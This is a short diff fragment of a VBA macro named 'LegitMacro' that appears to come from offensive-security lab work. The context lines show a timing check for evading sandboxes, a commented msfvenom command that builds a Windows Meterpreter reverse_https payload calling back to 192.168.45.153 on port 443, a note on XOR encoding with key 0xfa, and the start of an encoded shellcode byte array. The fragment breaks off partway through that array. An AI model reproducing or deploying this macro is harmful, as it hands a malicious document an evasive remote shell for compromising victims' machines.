@@ -28,6 +28,7 @@ Sub LegitMacro()
     If time < 10 Then
         Exit Sub
     End If
+    'Note Word is 32 bit...
     ' msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.153 LPORT=443 EXITFUNC=thread -f vbapplication
     ' Shellcode encoded with XOR with key 0xfa/250 (output from C# helper tool)
     buf = Array(6, 178, 121, 30, 10, 18, 54, 250, 250, 250, 187, 171, 187, 170, 168, 178, 203, 40, 159, 178, 113, 168, 154, 171, 178, 113, 168, 226, 178, 113, 168, 218, 172, 178, 245, 77, 176, 176, 178, 113, 136, 170, 183, 203, 51, 178, 203, 58, 86, 198, 155, _
